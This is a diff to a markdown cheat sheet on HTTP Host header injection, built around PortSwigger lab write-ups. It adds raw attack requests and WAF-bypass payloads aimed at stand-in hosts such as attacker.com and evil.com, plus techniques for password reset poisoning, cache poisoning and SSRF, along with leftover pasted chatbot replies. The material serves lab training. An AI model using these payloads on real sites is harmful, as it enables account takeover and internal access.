@@ -536,13 +536,93 @@ also do the same first three attack to insert the referer header (Change referer
 ## 8. Advanced Host Header Attacks
 ### Internal Host Access:
 ```http
-X-Originating-IP: 127.0.0.1
-X-Forwarded-For: 127.0.0.1
-X-Remote-IP: 127.0.0.1
-X-Remote-Addr: 127.0.0.1
+GET / HTTP/1.1
+Host: attacker.com
+
+GET / HTTP/1.1
+Host: vulnerable.com
+Host: attacker.com
+
+GET / HTTP/1.1
+Host: vulnerable.com
+X-Forwarded-Host: attacker.com
+
+GET https://vulnerable.com/ HTTP/1.1
+Host: attacker.com
+
+GET / HTTP/1.1
+Host: vulnerable.com
+X-Host: attacker.com
+X-Forwarded-Server: attacker.com
+X-HTTP-Host-Override: attacker.com
+Forwarded: host=attacker.com
 ```
 Based on your GitHub lab on [HTTP Host Header Attacks](https://github.com/Anvesh464/Portswigger-Labs/tree/main/20%20-%20HTTP%20Host%20header%20attacks), here's a **step-by-step breakdown** for each attack scenario from the PortSwigger labs.
 
+To identify Host Header Injection vulnerabilities, focus on these key parameters and headers:
+
+- **Host**: The primary header to test. Try injecting arbitrary domains.
+- **X-Forwarded-Host**: Often used by proxies; can override the Host header.
+- **X-Host**, **X-Forwarded-Server**, **X-HTTP-Host-Override**, **Forwarded**: Alternative headers that may be parsed by backend systems.
+- **Absolute URLs in request line**: Some servers prioritize the URL over the Host header.
+- **Duplicate Host headers**: Can cause discrepancies between frontend and backend parsing.
+- **Line wrapping or malformed headers**: Indentation or spacing tricks may bypass validation.
+
+🧨 **Common Payloads to Bypass WAFs**
+
+Here’s a cheat sheet of payloads that may help bypass WAFs during Host Header Injection testing:
+
+| Header Variant              | Payload Example              |
+|----------------------------|------------------------------|
+| Host                       | `evil.com`                   |
+| X-Forwarded-Host           | `evil.com`                   |
+| X-Host                     | `evil.com`                   |
+| X-Forwarded-Server         | `evil.com`                   |
+| X-HTTP-Host-Override       | `evil.com`                   |
+| Forwarded                  | `host=evil.com`              |
+| Absolute URL               | `GET https://evil.com/ HTTP/1.1` |
+| Duplicate Host             | `Host: vulnerable.com` + `Host: evil.com` |
+| Line Wrapping              | `Host: vulnerable.com\n Host: evil.com` |
+
+💡 **Tips for Bypassing WAFs**
+- Use **non-standard ports**: `Host: evil.com:badport`
+- Try **subdomain tricks**: `Host: attacker.vulnerable.com`
+- Use **encoded characters**: `%0d%0aHost: evil.com`
+- Leverage **proxy headers**: Some WAFs ignore `X-Forwarded-Host`
+
+Sure! Based on the content from the GitHub repository you linked, here are the **specific techniques demonstrated in the PortSwigger Labs for HTTP Host header attacks**:
+
+### 🧪 Techniques Covered in the Labs
+
+- **Password Reset Poisoning via Host Header**
+  - Modify the `Host` header to point to an attacker-controlled domain.
+  - Capture the password reset token sent to the malicious domain.
+
+- **Password Reset Poisoning via X-Forwarded-Host**
+  - Use `X-Forwarded-Host` instead of `Host` to poison the reset link.
+  - Useful when the application trusts proxy headers.
+
+- **Dangling Markup Injection**
+  - Inject HTML tags into the `Host` header to manipulate email content.
+  - Example: `<a href="http://evil.com">Click here</a>` embedded in the reset email.
+
+- **Web Cache Poisoning**
+  - Send ambiguous requests with multiple `Host` headers.
+  - Poison the cache to serve malicious content to other users.
+
+- **Host Header Authentication Bypass**
+  - Replace the `Host` header with `localhost` or internal IP to gain admin access.
+  - Exploits trust assumptions in routing logic.
+
+- **Routing-Based SSRF via Host Header**
+  - Use internal IPs in the `Host` header to access internal services.
+  - Example: `Host: 192.168.0.96` to reach `/admin` panel.
+
+- **SSRF via Flawed Request Parsing**
+  - Exploit parsing inconsistencies by combining external and internal hosts.
+  - Often requires Burp Collaborator to confirm SSRF behavior.
+
+These techniques are all demonstrated in the labs and write-ups within that GitHub repo. If you want, I can help you craft payloads or automate testing for each one.
 ---
 
 ## 💥 1. **Web Cache Poisoning via Host Header**
